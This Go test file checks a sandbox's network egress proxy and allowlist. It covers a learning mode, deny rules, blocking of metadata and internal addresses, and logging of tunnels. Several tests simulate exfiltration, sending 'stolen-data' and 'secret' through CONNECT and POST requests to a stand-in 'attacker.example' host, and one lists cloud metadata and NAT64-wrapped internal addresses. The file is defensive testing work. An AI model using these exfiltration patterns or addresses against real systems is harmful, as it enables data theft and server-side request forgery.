package netpolicy

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"testing"
	"time"
)

func learningList(t *testing.T, deny ...string) *Allowlist {
	t.Helper()
	a, err := mustParse(t, "known.example.com").WithDeny(deny)
	if err != nil {
		t.Fatal(err)
	}
	return a.WithLearning()
}

func TestLearningAdmitsWhatNoRuleNames(t *testing.T) {
	a := learningList(t)
	for _, c := range []struct {
		host string
		port int
	}{
		{"unknown.example.org", 443},
		{"unknown.example.org", 8443},
	} {
		if !a.Allows(c.host, c.port) {
			t.Errorf("learning refused %s:%d", c.host, c.port)
		}
	}
	if !a.AllowsName("unknown.example.org") {
		t.Error("learning refused to resolve an unknown name")
	}
}

func TestLearningStillHonoursTheDeny(t *testing.T) {
	a := learningList(t, "forbidden.example.com")
	for _, h := range []string{"forbidden.example.com", "sub.forbidden.example.com"} {
		if a.Allows(h, 443) || a.AllowsName(h) {
			t.Errorf("learning admitted the denied %s", h)
		}
	}
}

// Denies are keyed by name, so a literal address would reach a denied host
// by its IP.
func TestLearningAdmitsNoLiteralAddress(t *testing.T) {
	a := learningList(t, "forbidden.example.com")
	for _, ip := range []string{"93.184.216.34", "2606:2800:220:1::1"} {
		if a.Allows(ip, 443) {
			t.Errorf("learning admitted the literal address %s", ip)
		}
	}
}

// The infrastructure override matches literal grants only. Learning must not
// widen it, or it would open loopback, the docker gateway and metadata
// endpoints — the addresses the check exists for.
func TestLearningDoesNotOpenInfrastructure(t *testing.T) {
	a := learningList(t)
	for _, ip := range []string{"127.0.0.1", "169.254.169.254", "10.0.0.1", "172.17.0.1"} {
		if a.AllowsIP(net.ParseIP(ip), 80) {
			t.Errorf("learning let the infrastructure address %s through", ip)
		}
	}
	p := NewProxy(a)
	if err := p.permitAddress("169.254.169.254:80"); err == nil {
		t.Error("the proxy would connect to the metadata endpoint while learning")
	}
}

// A learned name was chosen by the workload, so its shape is checked the
// way a wildcard match is; an exact rule is still exempt.
func TestALearnedNameIsShapeChecked(t *testing.T) {
	a := learningList(t)
	if !a.matchedByWildcard("anything.example.org") {
		t.Error("a learned name was treated as a chosen one")
	}
	if a.matchedByWildcard("known.example.com") {
		t.Error("an exact rule lost its exemption under learning")
	}
	long := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.example.org"
	if NewProxy(a).exfilShape(long) == "" {
		t.Error("an encoded-looking name passed the CONNECT shape check while learning")
	}
}

func TestCoversIgnoresLearning(t *testing.T) {
	a := learningList(t)
	if !a.Covers("known.example.com", 443) {
		t.Error("a named destination is not covered")
	}
	if a.Covers("unknown.example.org", 443) {
		t.Error("Covers counted a learned destination as named")
	}
	if !a.Allows("unknown.example.org", 443) {
		t.Error("Covers switched learning off on the allowlist it was asked about")
	}
}

// Parse drops the mode, so without re-applying it a mid-run grant would end
// learning.
func TestARuntimeGrantKeepsLearning(t *testing.T) {
	a := learningList(t)
	p := NewProxy(a)
	r := NewResolver(a)
	c := NewControl(p, r, []string{"known.example.com"}, nil)

	if resp := c.mutate("allow", "other.example.com", true); !resp.OK {
		t.Fatalf("grant failed: %s", resp.Error)
	}
	if !p.Allowlist().Allows("unknown.example.org", 443) {
		t.Error("a runtime grant ended learning on the proxy")
	}
	if !r.Allowlist().AllowsName("unknown.example.org") {
		t.Error("a runtime grant ended learning on the resolver")
	}
}

func TestWithoutLearningNothingChanges(t *testing.T) {
	a := mustParse(t, "known.example.com")
	if a.Allows("unknown.example.org", 443) || a.AllowsName("unknown.example.org") || a.Learning() {
		t.Error("an ordinary allowlist admitted an unnamed host")
	}
}

func TestReservedAndWrappedAddressesAreInfrastructure(t *testing.T) {
	for _, s := range []string{
		"0.250.250.254", // OrbStack's host.docker.internal: the Mac
		"0.0.0.1",
		"192.0.0.8",
		"240.0.0.1",
		"255.255.255.255",
		"64:ff9b::a9fe:a9fe", // NAT64 around 169.254.169.254
		"64:ff9b::a00:1",     // NAT64 around 10.0.0.1
		"64:ff9b:1::a9fe:a9fe",
		"2002:a9fe:a9fe::1", // 6to4 around the metadata endpoint
		"::a9fe:a9fe",       // IPv4-compatible metadata endpoint
		"::ffff:10.0.0.1",
		"fd07:b51a:cc66:f0::fe",
	} {
		if !isInfrastructure(net.ParseIP(s)) {
			t.Errorf("%s is not treated as infrastructure", s)
		}
	}
}

// NAT64 and 6to4 are refused by where they lead, not wholesale: on an
// IPv6-only network NAT64 is how public IPv4 is reached at all.
func TestWrappedPublicAddressesStayReachable(t *testing.T) {
	for _, s := range []string{
		"93.184.216.34", "64:ff9b::5db8:d822", "2002:5db8:d822::1", "2606:2800:220:1::1",
		"198.18.0.7", // fake-IP DNS answers public names from here
	} {
		if isInfrastructure(net.ParseIP(s)) {
			t.Errorf("%s was refused as infrastructure", s)
		}
	}
}

func TestLearningAdmitsOnlyGrantableNames(t *testing.T) {
	a := learningList(t)
	for _, h := range []string{"fe80::1%eth0", "::1%lo0", "a b", "exa*mple.com", "ехample.com"} {
		if a.Allows(h, 443) || a.AllowsName(h) {
			t.Errorf("learning admitted %q", h)
		}
	}
}

func TestAZonedAddressIsNeverDialled(t *testing.T) {
	p := NewProxy(learningList(t))
	for _, addr := range []string{"[fe80::1%eth0]:443", "[::1%lo0]:80", "[2606:2800:220:1::1%en0]:443"} {
		err := p.permitAddress(addr)
		if err == nil {
			t.Errorf("the proxy would dial %s", addr)
			continue
		}
		if strings.Contains(err.Error(), "dev allow") {
			t.Errorf("%s: offers a grant no rule can express: %v", addr, err)
		}
	}
}

// A literal grant opens its own port only. Any name can resolve to the
// address, so a port-blind exception reaches every service on it.
func TestAnInfrastructureGrantOpensOnlyItsPort(t *testing.T) {
	p := NewProxy(mustParse(t, "127.0.0.1:443").WithLearning())
	if err := p.permitAddress("127.0.0.1:443"); err != nil {
		t.Errorf("the granted port was refused: %v", err)
	}
	for _, addr := range []string{"127.0.0.1:2375", "127.0.0.1:22", "127.0.0.1:80"} {
		if p.permitAddress(addr) == nil {
			t.Errorf("a grant of 127.0.0.1:443 opened %s", addr)
		}
	}
}

func TestAConnectionHeldOpenIsStillRecorded(t *testing.T) {
	open := `{"action":"open","host":"attacker.example","port":443,"method":"CONNECT"}`
	done := `{"action":"allow","host":"attacker.example","port":443,"method":"CONNECT","bytes":9}`

	if d := Destinations(open + "\n"); len(d) != 1 || d[0].Count != 1 {
		t.Errorf("a connection that never closed was not recorded: %+v", d)
	}
	if d := Destinations(open + "\n" + done + "\n"); len(d) != 1 || d[0].Count != 1 {
		t.Errorf("a finished connection was counted twice: %+v", d)
	}
}

// The far end receives the payload and never closes, so the tunnel's
// close-time "allow" is never written.
func TestATunnelIsLoggedWhenItConnects(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	got := make(chan string, 1)
	stop := make(chan struct{})
	defer close(stop)
	go func() {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		b := make([]byte, 16)
		n, _ := c.Read(b)
		got <- string(b[:n])
		<-stop
		_ = c.Close()
	}()

	c := &collector{}
	p := NewProxy(mustParse(t, "attacker.example"))
	p.Emit = c.emit
	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
		return net.Dial("tcp", ln.Addr().String())
	}
	conn, err := net.Dial("tcp", startProxy(t, p))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	fmt.Fprintf(conn, "CONNECT attacker.example:443 HTTP/1.1\r\nHost: attacker.example:443\r\n\r\n")
	br := bufio.NewReader(conn)
	if line, _ := br.ReadString('\n'); !strings.Contains(line, "200") {
		t.Fatalf("tunnel refused: %q", line)
	}
	_, _ = br.ReadString('\n')
	fmt.Fprint(conn, "stolen-data")
	if s := <-got; s != "stolen-data" {
		t.Fatalf("upstream got %q", s)
	}

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		for _, e := range c.all() {
			if e.Action == "open" && e.Host == "attacker.example" {
				return
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
	t.Fatalf("nothing recorded while the tunnel is held open: %+v", c.all())
}

// The upload arrives and the far end closes without a response, so the only
// other event is an "error", which is not a contact.
func TestAnUnansweredUploadIsRecorded(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	got := make(chan string, 1)
	go func() {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		req, err := http.ReadRequest(bufio.NewReader(c))
		if err == nil {
			b, _ := io.ReadAll(req.Body)
			got <- string(b)
		}
		_ = c.Close()
	}()

	c := &collector{}
	p := NewProxy(mustParse(t, "attacker.example"))
	p.Emit = c.emit
	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
		return net.Dial("tcp", ln.Addr().String())
	}
	proxyURL, _ := url.Parse("http://" + startProxy(t, p))
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}, Timeout: 5 * time.Second}
	resp, err := client.Post("http://attacker.example/up", "text/plain", strings.NewReader("secret"))
	if err == nil {
		_ = resp.Body.Close()
	}
	if s := <-got; s != "secret" {
		t.Fatalf("upstream got %q", s)
	}
	if !recorded(c, "attacker.example") {
		t.Fatalf("an upload that reached the far end is not recorded: %+v", c.all())
	}
}

// A TLS record header announcing 16 KB, then payload, never completed: the
// sniffer waits for the whole record and never settles.
func TestAnUnfinishedTLSRecordIsRecorded(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	stop := make(chan struct{})
	defer close(stop)
	got := make(chan int, 1)
	go func() {
		c, err := ln.Accept()
		if err != nil {
			return
		}
		b := make([]byte, 4096)
		n, _ := io.ReadAtLeast(c, b, 100)
		got <- n
		<-stop
		_ = c.Close()
	}()

	c := &collector{}
	p := NewProxy(mustParse(t, "attacker.example"))
	p.Emit = c.emit
	p.Dial = func(ctx context.Context, _, _ string) (net.Conn, error) {
		return net.Dial("tcp", ln.Addr().String())
	}
	conn, err := net.Dial("tcp", startProxy(t, p))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	fmt.Fprintf(conn, "CONNECT attacker.example:443 HTTP/1.1\r\nHost: attacker.example:443\r\n\r\n")
	br := bufio.NewReader(conn)
	_, _ = br.ReadString('\n')
	_, _ = br.ReadString('\n')
	_, _ = conn.Write(append([]byte{0x16, 0x03, 0x01, 0x40, 0x00}, []byte(strings.Repeat("x", 200))...))
	if n := <-got; n < 100 {
		t.Fatalf("upstream got only %d bytes", n)
	}
	if !recorded(c, "attacker.example") {
		t.Fatalf("a tunnel carrying data is not recorded: %+v", c.all())
	}
}

func recorded(c *collector, host string) bool {
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		var logs strings.Builder
		for _, e := range c.all() {
			b, _ := json.Marshal(e)
			logs.Write(append(b, '\n'))
		}
		for _, d := range Destinations(logs.String()) {
			if d.Host == host && !d.Denied {
				return true
			}
		}
		time.Sleep(10 * time.Millisecond)
	}
	return false
}

// A grant never overrides a deny, so holding a denied destination for an
// answer only makes someone wait on a question that changes nothing.
func TestADeniedHostIsNotHeldForADecision(t *testing.T) {
	a, err := mustParse(t, "known.example.com").WithDeny([]string{"denied.example.com"})
	if err != nil {
		t.Fatal(err)
	}
	c := &collector{}
	p := NewProxy(a)
	p.Emit = c.emit
	p.AskTimeout = 5 * time.Second

	start := time.Now()
	if p.awaitDecision(context.Background(), "denied.example.com", 443, "CONNECT") {
		t.Fatal("a denied host was allowed")
	}
	if waited := time.Since(start); waited > time.Second {
		t.Errorf("a denied host was held for %v", waited)
	}
	for _, e := range c.all() {
		if e.Action == "pending" {
			t.Errorf("a denied host was put to the user: %+v", e)
		}
	}
}

func TestADeniedHostIsReportedAsDenied(t *testing.T) {
	a, err := mustParse(t, "known.example.com").WithDeny([]string{"denied.example.com"})
	if err != nil {
		t.Fatal(err)
	}
	c := &collector{}
	p := NewProxy(a)
	p.Emit = c.emit
	conn, err := net.Dial("tcp", startProxy(t, p))
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	_ = conn.SetDeadline(time.Now().Add(5 * time.Second))
	fmt.Fprintf(conn, "GET http://denied.example.com/ HTTP/1.1\r\nHost: denied.example.com\r\nConnection: close\r\n\r\n")
	body, _ := io.ReadAll(conn)
	if strings.Contains(string(body), "--allow-host") {
		t.Errorf("a denied host was offered --allow-host:\n%s", body)
	}
	var reason string
	for _, e := range c.all() {
		if e.Action == "deny" {
			reason = e.Reason
		}
	}
	if reason != "denied by policy" {
		t.Errorf("deny reason = %q, want it to say the policy denied it", reason)
	}
}
